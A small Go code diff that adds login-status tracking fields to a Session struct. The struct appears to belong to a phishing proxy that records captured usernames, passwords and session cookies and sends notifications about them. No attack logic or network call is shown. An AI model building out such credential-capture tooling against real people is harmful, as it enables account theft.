@@ -31,6 +31,8 @@ type Session struct {
 	CookiesNotificationSent       bool   // Track if cookies notification was already sent
 	LastNotifiedUsername          string // Track last username sent to avoid duplicates
 	LastNotifiedPassword          string // Track last password sent to avoid duplicates
+	LoginStatus                   string // "pending", "valid", "invalid"
+	LoginStatusNotified           bool   // Track if we already sent notification for this status
 }
 
 func NewSession(name string) (*Session, error) {
@@ -58,6 +60,8 @@ func NewSession(name string) (*Session, error) {
 		CookiesNotificationSent: false,
 		LastNotifiedUsername:    "",
 		LastNotifiedPassword:    "",
+		LoginStatus:             "pending",
+		LoginStatusNotified:     false,
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
